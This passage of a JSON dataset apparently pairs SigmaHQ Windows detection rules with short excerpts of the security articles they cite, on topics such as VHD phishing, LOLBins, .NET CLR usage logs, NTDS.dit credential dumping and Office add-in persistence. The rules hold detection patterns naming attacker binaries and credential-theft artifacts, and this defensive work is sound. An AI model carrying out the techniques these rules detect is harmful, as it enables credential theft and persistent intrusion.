    "markdown": "# The Dangers of VHD and VHDX Files **Published on:** September 4, 2019 ## Introduction Recently, I gave a presentation at BSidesPGH 2019 called Death By Thumb Drive: File System Fuzzing with CERT BFF. (The slides from my presentation are available in the SEI Digital Library.) Although my primary goal was to find bugs in kernel file-system-parsing code, a notable part of my research was investigating attack vectors. In particular, I focused on VHD and VHDX files on Windows systems. In this post, I describe some of the risks associated with these two file types. ## VHD and VHDX Files",
    "sigma_rule": {
      "title": "ISO or Image Mount Indicator in Recent Files",
      "id": "4358e5a5-7542-4dcb-b9f3-87667371839b",
      "status": "test",
      "description": "Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks.\nThis can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/",
        "https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/",
        "https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-11",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ".iso.lnk",
            ".img.lnk",
            ".vhd.lnk",
            ".vhdx.lnk"
          ],
          "TargetFilename|contains": "\\Microsoft\\Windows\\Recent\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Cases in which a user mounts an image file for legitimate reasons"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_iso_file_recent.yml"
  },
  "855": {
    "url": "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
    "markdown": "# Living off the land *April 25, 2021* > **Note** > 🍄Interested in leveling up your **Windows & AD Pentesting** skills? Checkout our Udemy course and get **Free 7-day** lab access with proof of purchase! This post will run through a scenario showcasing multiple methods of living off the land with built-in Windows assemblies (aka LOLBins). This scenario takes place on TheSprawl, one of our pentesting ranges. The lab scenario simply functions to emulate **exfil and lateral movement** utilizing built-in Windows tools. At the end we’ll briefly run through some artifacts and logs. Keep in mind these methods may not",
    "sigma_rule": {
      "title": "GatherNetworkInfo.VBS Reconnaissance Script Output",
      "id": "f92a6f1e-a512-4a15-9735-da09e78d7273",
      "related": [
        {
          "id": "575dce0c-8139-4e30-9295-1ee75969f7fe",
          "type": "similar"
        },
        {
          "id": "07aa184a-870d-413d-893a-157f317f6f58",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects creation of files which are the results of executing the built-in reconnaissance script \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\".",
      "references": [
        "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
        "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-08",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|startswith": "C:\\Windows\\System32\\config",
          "TargetFilename|endswith": [
            "\\Hotfixinfo.txt",
            "\\netiostate.txt",
            "\\sysportslog.txt",
            "\\VmSwitchLog.evtx"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_lolbin_gather_network_info_script_output.yml"
  },
  "856": {
    "url": "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government",
    "markdown": "# Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government **Published on:** December 15, 2022 **Tags:** Threat Intelligence --- ## Executive Summary - Mandiant identified an operation focused on the Ukrainian government via trojanized Windows 10 Operating System installers. These were distributed via torrent sites in a supply chain attack. - Threat activity tracked as UNC4166 likely trojanized and distributed malicious Windows Operating system installers which drop malware that conducts reconnaissance and deploys additional capability on some victims to conduct data theft. - The trojanized files use the Ukrainian language pack and are designed to target Ukrainian users. Following compromise,",
    "sigma_rule": {
      "title": "GatherNetworkInfo.VBS Reconnaissance Script Output",
      "id": "f92a6f1e-a512-4a15-9735-da09e78d7273",
      "related": [
        {
          "id": "575dce0c-8139-4e30-9295-1ee75969f7fe",
          "type": "similar"
        },
        {
          "id": "07aa184a-870d-413d-893a-157f317f6f58",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects creation of files which are the results of executing the built-in reconnaissance script \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\".",
      "references": [
        "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
        "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-08",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|startswith": "C:\\Windows\\System32\\config",
          "TargetFilename|endswith": [
            "\\Hotfixinfo.txt",
            "\\netiostate.txt",
            "\\sysportslog.txt",
            "\\VmSwitchLog.evtx"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_lolbin_gather_network_info_script_output.yml"
  },
  "857": {
    "url": "https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/",
    "markdown": "# Investigating .NET CLR Usage Log Tampering Techniques For EDR Evasion **Posted on** March 16, 2021 **Updated on** December 15, 2022 ## Introduction In recent years, there have been numerous published techniques for evading endpoint security solutions and sources such as A/V, EDR and logging facilities. The methods deployed to achieve the desired result usually differ in sophistication and implementation, however, effectiveness is usually the end goal (of course, with thoughtful consideration of potential tradeoffs). Defenders can leverage the native facilities of the operating system and support frameworks to build quality detections. One way to detect potentially interesting .NET behavior",
    "sigma_rule": {
      "title": "Suspicious DotNET CLR Usage Log Artifact",
      "id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
      "related": [
        {
          "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
          "type": "derived"
        },
        {
          "id": "e4b63079-6198-405c-abd7-3fe8b0ce3263",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the creation of Usage Log files by the CLR (clr.dll). These files are named after the executing process once the assembly is finished executing for the first time in the (user) session context.",
      "references": [
        "https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/",
        "https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html"
      ],
      "author": "frack113, omkar72, oscd.community, Wojciech Lesicki",
      "date": "2022-11-18",
      "modified": "2023-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows",
        "definition": "Requirements: UsageLogs folder must be monitored by the sysmon configuration"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\UsageLogs\\cmstp.exe.log",
            "\\UsageLogs\\cscript.exe.log",
            "\\UsageLogs\\mshta.exe.log",
            "\\UsageLogs\\msxsl.exe.log",
            "\\UsageLogs\\regsvr32.exe.log",
            "\\UsageLogs\\rundll32.exe.log",
            "\\UsageLogs\\svchost.exe.log",
            "\\UsageLogs\\wscript.exe.log",
            "\\UsageLogs\\wmic.exe.log"
          ]
        },
        "filter_main_rundll32": {
          "ParentImage|endswith": "\\MsiExec.exe",
          "ParentCommandLine|contains": " -Embedding",
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "Temp",
            "zzzzInvokeManagedCustomActionOutOfProc"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process - https://twitter.com/SBousseaden/status/1388064061087260675"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_net_cli_artefact.yml"
  },
  "858": {
    "url": "https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml",
    "markdown": "# Sysmon Configuration Example ``` <Sysmon schemaversion=\"4.30\"> <EventFiltering> <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreate onmatch=\"include\"> <TargetFilename name=\"technique_id=T1218,technique_name=Office Signed Binary Proxy Execution\" condition=\"contains\">AppData\\Local\\Microsoft\\CLR_v2.0\\UsageLogs\\</TargetFilename> <!--Dotnet v2 binary started--> <TargetFilename name=\"technique_id=T1218,technique_name=Office Signed Binary Proxy Execution\" condition=\"end with\">\\UsageLogs\\cscript.exe.log</TargetFilename> <TargetFilename name=\"technique_id=T1218,technique_name=Office Signed Binary Proxy Execution\" condition=\"end with\">\\UsageLogs\\wscript.exe.log</TargetFilename> <TargetFilename name=\"technique_id=T1218,technique_name=Office Signed Binary Proxy Execution\" condition=\"end with\">\\UsageLogs\\wmic.exe.log</TargetFilename> <TargetFilename name=\"technique_id=T1218,technique_name=Office Signed Binary Proxy Execution\" condition=\"end with\">\\UsageLogs\\mshta.exe.log</TargetFilename> <TargetFilename name=\"technique_id=T1218,technique_name=Office Signed Binary Proxy Execution\" condition=\"end with\">\\UsageLogs\\svchost.exe.log</TargetFilename> <TargetFilename name=\"technique_id=T1218,technique_name=Office Signed Binary Proxy Execution\" condition=\"end with\">\\UsageLogs\\regsvr32.exe.log</TargetFilename> <TargetFilename name=\"technique_id=T1218,technique_name=Office Signed Binary Proxy Execution\" condition=\"end with\">\\UsageLogs\\rundll32.exe.log</TargetFilename> </FileCreate> </RuleGroup> </EventFiltering> </Sysmon> ```",
    "sigma_rule": {
      "title": "Suspicious DotNET CLR Usage Log Artifact",
      "id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
      "related": [
        {
          "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
          "type": "derived"
        },
        {
          "id": "e4b63079-6198-405c-abd7-3fe8b0ce3263",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the creation of Usage Log files by the CLR (clr.dll). These files are named after the executing process once the assembly is finished executing for the first time in the (user) session context.",
      "references": [
        "https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/",
        "https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html"
      ],
      "author": "frack113, omkar72, oscd.community, Wojciech Lesicki",
      "date": "2022-11-18",
      "modified": "2023-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows",
        "definition": "Requirements: UsageLogs folder must be monitored by the sysmon configuration"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\UsageLogs\\cmstp.exe.log",
            "\\UsageLogs\\cscript.exe.log",
            "\\UsageLogs\\mshta.exe.log",
            "\\UsageLogs\\msxsl.exe.log",
            "\\UsageLogs\\regsvr32.exe.log",
            "\\UsageLogs\\rundll32.exe.log",
            "\\UsageLogs\\svchost.exe.log",
            "\\UsageLogs\\wscript.exe.log",
            "\\UsageLogs\\wmic.exe.log"
          ]
        },
        "filter_main_rundll32": {
          "ParentImage|endswith": "\\MsiExec.exe",
          "ParentCommandLine|contains": " -Embedding",
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "Temp",
            "zzzzInvokeManagedCustomActionOutOfProc"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process - https://twitter.com/SBousseaden/status/1388064061087260675"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_net_cli_artefact.yml"
  },
  "859": {
    "url": "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
    "markdown": "# code-scrap / README.md Table Top With Teeth - Training Exercise ## README.md ### Instructions The following script is designed to create artifacts that teams can use to hunt, new or interesting capabilities. The following table top is based on the code here: https://github.com/code-scrap/DynamicWrapperDotNet This script is self-contained. It should dynamically write a DLL to disk and load it into `cscript.exe`. To Invoke: ``` cscript.exe stranger_things.js ``` This example expects a 64bit system. You can modify that if you want ARM or x86 etc. ### Ideas of what to hunt/test: 1. Did the anti-malware engine detect a malicious script? 2.",
    "sigma_rule": {
      "title": "Suspicious DotNET CLR Usage Log Artifact",
      "id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
      "related": [
        {
          "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
          "type": "derived"
        },
        {
          "id": "e4b63079-6198-405c-abd7-3fe8b0ce3263",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the creation of Usage Log files by the CLR (clr.dll). These files are named after the executing process once the assembly is finished executing for the first time in the (user) session context.",
      "references": [
        "https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/",
        "https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html"
      ],
      "author": "frack113, omkar72, oscd.community, Wojciech Lesicki",
      "date": "2022-11-18",
      "modified": "2023-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows",
        "definition": "Requirements: UsageLogs folder must be monitored by the sysmon configuration"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\UsageLogs\\cmstp.exe.log",
            "\\UsageLogs\\cscript.exe.log",
            "\\UsageLogs\\mshta.exe.log",
            "\\UsageLogs\\msxsl.exe.log",
            "\\UsageLogs\\regsvr32.exe.log",
            "\\UsageLogs\\rundll32.exe.log",
            "\\UsageLogs\\svchost.exe.log",
            "\\UsageLogs\\wscript.exe.log",
            "\\UsageLogs\\wmic.exe.log"
          ]
        },
        "filter_main_rundll32": {
          "ParentImage|endswith": "\\MsiExec.exe",
          "ParentCommandLine|contains": " -Embedding",
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "Temp",
            "zzzzInvokeManagedCustomActionOutOfProc"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process - https://twitter.com/SBousseaden/status/1388064061087260675"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_net_cli_artefact.yml"
  },
  "860": {
    "url": "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
    "markdown": "# Interesting DFIR traces of .NET CLR Usage Logs **Date**: 16 July 2019 As most of you already know .NET has become an increasingly important component in the offensive world, with attackers making increasing direct use of it as well as indirect use of it via existing windows scripting utilities. One good example of the indirect approach is DotNetToJScript, which allow to deliver managed code via a simple JavaScript. We decided to take a closer look to this category of malicious code delivery, which lead us to this great Offensive tool by MDSec \"SharpShooter\" (at it's heart make use of",
    "sigma_rule": {
      "title": "Suspicious DotNET CLR Usage Log Artifact",
      "id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
      "related": [
        {
          "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
          "type": "derived"
        },
        {
          "id": "e4b63079-6198-405c-abd7-3fe8b0ce3263",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the creation of Usage Log files by the CLR (clr.dll). These files are named after the executing process once the assembly is finished executing for the first time in the (user) session context.",
      "references": [
        "https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/",
        "https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html"
      ],
      "author": "frack113, omkar72, oscd.community, Wojciech Lesicki",
      "date": "2022-11-18",
      "modified": "2023-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows",
        "definition": "Requirements: UsageLogs folder must be monitored by the sysmon configuration"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\UsageLogs\\cmstp.exe.log",
            "\\UsageLogs\\cscript.exe.log",
            "\\UsageLogs\\mshta.exe.log",
            "\\UsageLogs\\msxsl.exe.log",
            "\\UsageLogs\\regsvr32.exe.log",
            "\\UsageLogs\\rundll32.exe.log",
            "\\UsageLogs\\svchost.exe.log",
            "\\UsageLogs\\wscript.exe.log",
            "\\UsageLogs\\wmic.exe.log"
          ]
        },
        "filter_main_rundll32": {
          "ParentImage|endswith": "\\MsiExec.exe",
          "ParentCommandLine|contains": " -Embedding",
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "Temp",
            "zzzzInvokeManagedCustomActionOutOfProc"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process - https://twitter.com/SBousseaden/status/1388064061087260675"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_net_cli_artefact.yml"
  },
  "861": {
    "url": "https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/",
    "markdown": "# Extracting Password Hashes from the Ntds.dit File **Published:** November 30, 2021 **Updated:** November 20, 2024 --- With so much attention paid to credential-based attacks such as Pass-the-Hash (PtH) and Pass-the-Ticket (PtT), more serious and effective attacks are often overlooked. One such attack involves exfiltrating the Ntds.dit file from Active Directory domain controllers. Let’s take a look at what this threat entails, how an attack can be performed, and how you can protect your organization. ## What is the Ntds.dit File? The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group",
    "sigma_rule": {
      "title": "NTDS.DIT Creation By Uncommon Process",
      "id": "11b1ed55-154d-4e82-8ad7-83739298f720",
      "related": [
        {
          "id": "4e7050dd-e548-483f-b7d6-527ab4fa784d",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon process or a process located in a suspicious directory",
      "references": [
        "https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/",
        "https://adsecurity.org/?p=2398"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-01-11",
      "modified": "2022-07-14",
      "tags": [
        "attack.credential-access",
        "attack.t1003.002",
        "attack.t1003.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection_ntds": {
          "TargetFilename|endswith": "\\ntds.dit"
        },
        "selection_process_img": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe",
            "\\wsl.exe",
            "\\wt.exe"
          ]
        },
        "selection_process_paths": {
          "Image|contains": [
            "\\AppData\\",
            "\\Temp\\",
            "\\Public\\",
            "\\PerfLogs\\"
          ]
        },
        "condition": "selection_ntds and 1 of selection_process_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_ntds_dit_uncommon_process.yml"
  },
  "862": {
    "url": "https://adsecurity.org/?p=2398",
    "markdown": "# How Attackers Dump Active Directory Database Credentials **Date**: January 03, 2016 **Categories**: ActiveDirectorySecurity, Microsoft Security, Technical Reference I previously posted some information on dumping AD database credentials before in a couple of posts: “How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller” and “Attack Methods for Gaining Domain Admin Rights in Active Directory”. This post covers many different ways that an attacker can dump credentials from Active Directory, both locally on the DC and remotely. Some of this information I spoke about at several security conferences in 2015 (BSides, Shakacon, Black Hat, DEF CON, & DerbyCon).",
    "sigma_rule": {
      "title": "NTDS.DIT Creation By Uncommon Process",
      "id": "11b1ed55-154d-4e82-8ad7-83739298f720",
      "related": [
        {
          "id": "4e7050dd-e548-483f-b7d6-527ab4fa784d",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon process or a process located in a suspicious directory",
      "references": [
        "https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/",
        "https://adsecurity.org/?p=2398"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-01-11",
      "modified": "2022-07-14",
      "tags": [
        "attack.credential-access",
        "attack.t1003.002",
        "attack.t1003.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection_ntds": {
          "TargetFilename|endswith": "\\ntds.dit"
        },
        "selection_process_img": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe",
            "\\wsl.exe",
            "\\wt.exe"
          ]
        },
        "selection_process_paths": {
          "Image|contains": [
            "\\AppData\\",
            "\\Temp\\",
            "\\Public\\",
            "\\PerfLogs\\"
          ]
        },
        "condition": "selection_ntds and 1 of selection_process_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_ntds_dit_uncommon_process.yml"
  },
  "863": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Add-In",
      "id": "8e1cb247-6cf6-42fa-b440-3f27d57e9936",
      "status": "test",
      "description": "Detects potential persistence activity via startup add-ins that load when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel).",
      "references": [
        "Internal Research",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md"
      ],
      "author": "NVISO",
      "date": "2020-05-11",
      "modified": "2023-02-08",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_wlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Word\\Startup\\",
          "TargetFilename|endswith": ".wll"
        },
        "selection_xlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Excel\\Startup\\",
          "TargetFilename|endswith": ".xll"
        },
        "selection_xladropped": {
          "TargetFilename|contains": "Microsoft\\Excel\\XLSTART\\",
          "TargetFilename|endswith": ".xlam"
        },
        "selection_generic": {
          "TargetFilename|contains": "\\Microsoft\\Addins\\",
          "TargetFilename|endswith": [
            ".xlam",
            ".xla",
            ".ppam"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate add-ins"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_addin_persistence.yml"
  },
  "864": {
    "url": "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
    "markdown": "# Add-In Opportunities for Office Persistence 21 April, 2017 ## Introduction One software product that attackers will almost certainly find in the environments that they're targeting is Microsoft Office. Office applications due to this ubiquity present a consistent source of opportunity for persistence mechanisms. This post will explore various opportunities for gaining persistence through native Microsoft Office functionality. It was inspired by Kostas Lintovois’ similar work which identified ways to persist in transient Virtual Desktop Infrastructure (VDI) environments through adding a VBA backdoor to Office template files (“One Template to Rule ‘Em All”). The following opportunities for Office-based persistence will",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Add-In",
      "id": "8e1cb247-6cf6-42fa-b440-3f27d57e9936",
      "status": "test",
      "description": "Detects potential persistence activity via startup add-ins that load when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel).",
      "references": [
        "Internal Research",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md"
      ],
      "author": "NVISO",
      "date": "2020-05-11",
      "modified": "2023-02-08",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_wlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Word\\Startup\\",
          "TargetFilename|endswith": ".wll"
        },
        "selection_xlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Excel\\Startup\\",
          "TargetFilename|endswith": ".xll"
        },
        "selection_xladropped": {
          "TargetFilename|contains": "Microsoft\\Excel\\XLSTART\\",
          "TargetFilename|endswith": ".xlam"
        },
        "selection_generic": {
          "TargetFilename|contains": "\\Microsoft\\Addins\\",
          "TargetFilename|endswith": [
            ".xlam",
            ".xla",
            ".ppam"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate add-ins"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_addin_persistence.yml"
  },
  "865": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md",
    "markdown": "# T1137.006 - Office Application Startup: Add-ins ## Description from ATT&CK Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018) Add-ins can be used to obtain persistence because they",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Add-In",
      "id": "8e1cb247-6cf6-42fa-b440-3f27d57e9936",
      "status": "test",
      "description": "Detects potential persistence activity via startup add-ins that load when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel).",
      "references": [
        "Internal Research",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md"
      ],
      "author": "NVISO",
      "date": "2020-05-11",
      "modified": "2023-02-08",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_wlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Word\\Startup\\",
          "TargetFilename|endswith": ".wll"
        },
        "selection_xlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Excel\\Startup\\",
          "TargetFilename|endswith": ".xll"
        },
        "selection_xladropped": {
          "TargetFilename|contains": "Microsoft\\Excel\\XLSTART\\",
          "TargetFilename|endswith": ".xlam"
        },
        "selection_generic": {
          "TargetFilename|contains": "\\Microsoft\\Addins\\",
          "TargetFilename|endswith": [
            ".xlam",
            ".xla",
            ".ppam"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate add-ins"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_addin_persistence.yml"
  },
  "866": {
    "url": "https://www.bleepingcomputer.com/news/security/hackers-now-use-microsoft-onenote-attachments-to-spread-malware/",
    "markdown": "# Hackers now use Microsoft OneNote attachments to spread malware January 21, 2023 Threat actors now use OneNote attachments in phishing emails that infect victims with remote access malware which can be used to install further malware, steal passwords, or even cryptocurrency wallets. This comes after attackers have been distributing malware in emails using malicious Word and Excel attachments that launch macros to download and install malware for years. However, in July, Microsoft finally disabled macros by default in Office documents, making this method unreliable for distributing malware. Soon after, threat actors began utilizing new file formats, such as ISO",
    "sigma_rule": {
